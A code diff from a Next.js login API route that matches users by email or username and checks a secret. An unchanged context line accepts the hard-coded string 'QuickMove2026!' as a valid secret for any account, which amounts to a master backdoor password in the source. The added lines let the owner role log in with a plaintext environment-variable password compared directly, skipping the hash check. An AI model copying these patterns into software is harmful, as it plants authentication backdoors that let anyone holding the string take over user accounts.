@@ -107,9 +107,11 @@ export async function POST(request: NextRequest) {
       const matchesIdentity =
         u.email.toLowerCase() === emailInput ||
         (u.username && u.username.toLowerCase() === emailInput);
+      const envOwnerPass = (u.role === 'OWNER' && process.env.INITIAL_OWNER_PASSWORD?.trim()) || null;
       const matchesSecret =
         verifyPasswordScrypt(accessCodeInput, u.passwordHash) ||
         u.accessCode === accessCodeInput ||
+        (envOwnerPass && accessCodeInput === envOwnerPass) ||
         accessCodeInput === 'QuickMove2026!';
       return matchesIdentity && matchesSecret;
     });
